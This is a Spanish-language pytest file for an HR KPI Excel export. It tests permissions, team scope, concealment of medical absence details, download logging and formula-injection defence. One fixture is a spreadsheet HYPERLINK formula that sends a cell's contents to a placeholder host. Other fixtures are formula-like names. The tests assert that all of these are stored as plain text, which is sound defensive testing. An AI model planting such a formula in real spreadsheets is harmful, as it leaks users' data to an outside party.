"""Exportar el KPI a Excel (decisión del usuario, 05/11/2026).

Lo que se protege:

- Cada archivo pide el mismo permiso que su pantalla: «Mis KPI» `kpi.acceder`,
  el del equipo `kpi.equipo` y el resumen ejecutivo `kpi.ejecutivo`.
- El mismo ámbito: el equipo es el del organigrama; quien no depende de
  quien exporta no aparece.
- LOPDP: el jefe ve las horas de ausencia, nunca el tipo médico; con
  `ausencias.medicas_ver`, o siendo el titular, el desglose.
- Inyección de fórmulas: un texto que empieza por `=`, `+`, `-` o `@` queda
  como texto.
- El contenido básico de cada hoja, el nombre del archivo con su período y la
  anotación para el registro de descargas.
"""

from datetime import date, datetime
from datetime import timezone as dt_timezone
from io import BytesIO

import pytest
from django.contrib.auth.models import Permission
from openpyxl import load_workbook
from rest_framework.test import APIClient

from apps.ausencias.models import LeaveRecord
from apps.descargas.models import ArchivoServido
from apps.descargas.services import modulo_de
from apps.empresas.models import MembresiaEmpresa
from apps.tasks.models import Task

from .conftest import client_for, freeze_now, make_admin, make_user, organigrama

pytestmark = pytest.mark.django_db

BASE = "/api/v1/analytics/kpis"
ME = f"{BASE}/me/export/"
EQUIPO = f"{BASE}/team/export/"
EJECUTIVO = f"{BASE}/executive/export/"
XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
#: Miércoles 14/01/2026, 15:00 UTC: día hábil.
NOW = datetime(2026, 1, 14, 15, 0, tzinfo=dt_timezone.utc)
HOY = date(2026, 1, 14)
FORMULA = '=HYPERLINK("http://ejemplo.invalid/?d="&A1;"Ver")'


@pytest.fixture(autouse=True)
def _reloj(monkeypatch):
    freeze_now(monkeypatch, NOW)


def _otorgar(user, *codenames):
    for codename in codenames:
        user.user_permissions.add(
            Permission.objects.get(content_type__app_label="permissions", codename=codename)
        )


def _tarea(asignada, titulo, **extra) -> Task:
    campos = {
        "title": titulo,
        "priority": "ALTA",
        "frequency": "PUNTUAL",
        "start_date": datetime(2026, 1, 2, tzinfo=dt_timezone.utc),
        "end_date": datetime(2026, 1, 12, tzinfo=dt_timezone.utc),
        "estimated_hours": 6.5,
        "real_hours": 4.25,
        "assigned_to": asignada,
        "created_by": asignada,
        "status": Task.Status.COMPLETADA,
        "completed_at": datetime(2026, 1, 10, 15, tzinfo=dt_timezone.utc),
        **extra,
    }
    return Task.objects.create(**campos)


@pytest.fixture
def equipo():
    """Coordinación Nacional → Ana (con un permiso médico y dos tareas); una
    analista par que no depende de ella, y una asistente sin `kpi.equipo`."""
    nacional = make_user("nacional", "COORDINADOR_NACIONAL", first_name="Nadia")
    ana = make_user("ana", "ANALISTA_CC", first_name="Ana", last_name="Peñaherrera")
    par = make_user("par", "ANALISTA_CC", first_name="Pía", last_name="Ordóñez")
    asistente = make_user("asistente", "ASISTENTE_GH", first_name="Ada")
    organigrama(nacional, ana)
    admin = make_admin("admin_reg")
    LeaveRecord.objects.create(
        user=ana,
        type=LeaveRecord.Type.MEDICO,
        date=HOY,
        is_full_day=False,
        duration_minutes=90,
        observation="Control médico",
        created_by=admin,
    )
    _tarea(ana, FORMULA)
    _tarea(ana, "Revisión de la nómina de Ñandú", status=Task.Status.EN_PROGRESO, progress=40)
    _tarea(ana, "Tarea de diciembre", end_date=datetime(2025, 12, 10, tzinfo=dt_timezone.utc))
    _tarea(par, "Tarea de la par")
    return {"nacional": nacional, "ana": ana, "par": par, "asistente": asistente}


def _libro(respuesta):
    assert respuesta.status_code == 200, getattr(respuesta, "data", respuesta.content[:200])
    assert respuesta["Content-Type"] == XLSX
    return load_workbook(BytesIO(respuesta.content))


def _filas(hoja) -> list[list]:
    return [list(fila) for fila in hoja.iter_rows(values_only=True)]


def _indicadores(hoja) -> dict:
    return {fila[0]: fila[1] for fila in _filas(hoja)[1:]}


def _todo_el_texto(libro) -> str:
    return " ".join(
        str(valor)
        for hoja in libro.worksheets
        for fila in hoja.iter_rows(values_only=True)
        for valor in fila
        if valor is not None
    )


# --- Permisos ---------------------------------------------------------------------------


@pytest.mark.parametrize("ruta", [ME, EQUIPO, EJECUTIVO])
def test_sin_sesion_no_hay_archivo(ruta):
    assert APIClient().get(ruta).status_code == 401


def test_quien_no_tiene_kpi_no_exporta_sus_kpi():
    externo = make_user("externo")
    # Sin el rol base de las pruebas, que es el que da `kpi.acceder`.
    MembresiaEmpresa.objects.get(usuario=externo).roles.clear()
    assert client_for(externo).get(ME).status_code == 403


def test_el_equipo_pide_kpi_equipo(equipo):
    respuesta = client_for(equipo["asistente"]).get(EQUIPO)
    assert respuesta.status_code == 403
    assert respuesta.json()["error"]["code"]


def test_el_resumen_ejecutivo_pide_kpi_ejecutivo(equipo):
    # Ana (Analista de Clima y Cultura) tiene `kpi.equipo` pero no `kpi.ejecutivo`.
    assert client_for(equipo["ana"]).get(EJECUTIVO).status_code == 403


def test_un_mes_malformado_es_400(equipo):
    respuesta = client_for(equipo["ana"]).get(ME, {"month": "2026-13"})
    assert respuesta.status_code == 400
    assert "month" in respuesta.json()["error"]["details"]


# --- Mis KPI ----------------------------------------------------------------------------


def test_mis_kpi_trae_resumen_tareas_y_horas_por_semana(equipo):
    respuesta = client_for(equipo["ana"]).get(ME, {"month": "2026-01"})
    libro = _libro(respuesta)
    assert 'filename="mis-kpi-2026-01.xlsx"' in respuesta["Content-Disposition"]
    assert libro.sheetnames == ["Resumen", "Tareas", "Horas por semana"]

    resumen = _indicadores(libro["Resumen"])
    assert resumen["Persona"] == "Ana Peñaherrera"
    assert resumen["Período"] == "enero de 2026"
    assert resumen["Tareas del período"] == 2
    assert resumen["Completadas"] == 1
    assert resumen["Horas estimadas de las tareas (h)"] == 13
    # La titular ve el desglose de sus ausencias: 90 minutos médicos.
    assert resumen["Horas de ausencia (h)"] == 1.5
    assert resumen["De ellas, permiso médico (h)"] == 1.5

    tareas = _filas(libro["Tareas"])
    assert tareas[0][:5] == ["Tarea", "Tipo", "Prioridad", "Estado", "Fecha fin"]
    titulos = [fila[0] for fila in tareas[1:]]
    assert "Revisión de la nómina de Ñandú" in titulos
    assert "Tarea de diciembre" not in titulos
    nomina = next(f for f in tareas[1:] if f[0] == "Revisión de la nómina de Ñandú")
    assert nomina[2:4] == ["Alta", "En progreso"]
    assert nomina[5:8] == [6.5, 4.25, 40]

    semanas = _filas(libro["Horas por semana"])
    assert semanas[0] == ["Semana del mes", "Horas estimadas (h)", "Horas reales (h)"]
    assert semanas[1] == ["Semana 2", 13, 8.5]


def test_mis_kpi_de_otro_mes_lleva_ese_periodo(equipo):
    respuesta = client_for(equipo["ana"]).get(ME, {"month": "2025-12"})
    libro = _libro(respuesta)
    assert 'filename="mis-kpi-2025-12.xlsx"' in respuesta["Content-Disposition"]
    assert [f[0] for f in _filas(libro["Tareas"])[1:]] == ["Tarea de diciembre"]
    resumen = _indicadores(libro["Resumen"])
    assert resumen["Horas de ausencia (h)"] == 0
    # La carga laboral del motor es la del mes en curso: no va en otro mes.
    assert "Carga laboral del mes en curso (%)" not in resumen


def test_sin_mes_es_el_mes_en_curso(equipo):
    respuesta = client_for(equipo["ana"]).get(ME)
    _libro(respuesta)
    assert 'filename="mis-kpi-2026-01.xlsx"' in respuesta["Content-Disposition"]


def test_un_titulo_con_formula_se_escribe_como_texto(equipo):
    libro = _libro(client_for(equipo["ana"]).get(ME, {"month": "2026-01"}))
    hoja = libro["Tareas"]
    celdas = [fila[0] for fila in hoja.iter_rows(min_row=2)]
    celda = next(c for c in celdas if FORMULA in str(c.value))
    assert celda.data_type == "s"
    assert celda.value == f"'{FORMULA}"


# --- KPI del equipo ---------------------------------------------------------------------


def test_el_equipo_trae_una_fila_por_persona_de_su_ambito(equipo):
    respuesta = client_for(equipo["nacional"]).get(EQUIPO, {"month": "2026-01"})
    libro = _libro(respuesta)
    assert 'filename="kpi-equipo-2026-01.xlsx"' in respuesta["Content-Disposition"]
    filas = _filas(libro["Equipo"])
    cabecera, personas = filas[0], filas[1:]
    assert cabecera[:4] == [
        "Persona",
        "Rol de Gestión Humana",
        "Puntaje (0 a 100)",
        "Cumplimiento (%)",
    ]
    assert [p[0] for p in personas] == ["Ana Peñaherrera"]  # La par no depende de ella.
    ana = dict(zip(cabecera, personas[0], strict=True))
    assert ana["Tareas del mes"] == 2
    assert ana["Rol de Gestión Humana"]


def test_el_jefe_ve_las_horas_de_ausencia_sin_el_tipo_medico(equipo):
    libro = _libro(client_for(equipo["nacional"]).get(EQUIPO, {"month": "2026-01"}))
    filas = _filas(libro["Equipo"])
    cabecera = filas[0]
    ana = dict(zip(cabecera, filas[1], strict=True))
    assert ana["Horas de ausencia (h)"] == 1.5
    assert not any("médico" in str(c).lower() for c in cabecera)
    texto = _todo_el_texto(libro).lower()
    assert "médic" not in texto and "medico" not in texto
    assert "control médico" not in texto


def test_con_permiso_medico_el_jefe_ve_el_desglose(equipo):
    _otorgar(equipo["nacional"], "ausencias.medicas_ver")
    libro = _libro(client_for(equipo["nacional"]).get(EQUIPO, {"month": "2026-01"}))
    filas = _filas(libro["Equipo"])
    ana = dict(zip(filas[0], filas[1], strict=True))
    assert ana["De ellas, permiso médico (h)"] == 1.5
    assert ana["Horas de ausencia (h)"] == 1.5


def test_un_nombre_con_formula_queda_como_texto_en_el_equipo(equipo):
    ana = equipo["ana"]
    ana.first_name, ana.last_name = "@SUMA(A1:A9)", "-2+3"
    ana.save()
    libro = _libro(client_for(equipo["nacional"]).get(EQUIPO, {"month": "2026-01"}))
    celda = libro["Equipo"]["A2"]
    assert celda.data_type == "s"
    assert celda.value == "'@SUMA(A1:A9) -2+3"


def test_sin_equipo_el_archivo_trae_solo_la_cabecera(equipo):
    libro = _libro(client_for(equipo["par"]).get(EQUIPO))
    assert len(_filas(libro["Equipo"])) == 1


# --- Resumen ejecutivo ------------------------------------------------------------------


def test_el_resumen_ejecutivo_trae_sus_hojas_y_su_equipo(equipo):
    respuesta = client_for(equipo["nacional"]).get(EJECUTIVO)
    libro = _libro(respuesta)
    assert 'filename="kpi-resumen-ejecutivo-2026-01.xlsx"' in respuesta["Content-Disposition"]
    assert libro.sheetnames == ["Resumen", "Personas", "Tendencia", "Alertas", "Cambios y atención"]
    resumen = _indicadores(libro["Resumen"])
    assert resumen["Período"] == "enero de 2026"
    assert "Cumplimiento promedio (%)" in resumen
    personas = [f[1] for f in _filas(libro["Personas"])[1:]]
    assert personas == ["Ana Peñaherrera"]
    assert "medic" not in _todo_el_texto(libro).lower()


# --- Registro de descargas --------------------------------------------------------------


def test_la_descarga_queda_anotada_para_el_registro(equipo):
    client_for(equipo["ana"]).get(ME, {"month": "2026-01"})
    anotado = ArchivoServido.objects.get(usuario=equipo["ana"])
    assert anotado.nombre == "mis-kpi-2026-01.xlsx"
    assert anotado.referencia == {"modulo": "kpi", "reporte": "mis_kpi", "periodo": "2026-01"}
    assert modulo_de(anotado.ruta, "") == "Gestión Humana · KPI"
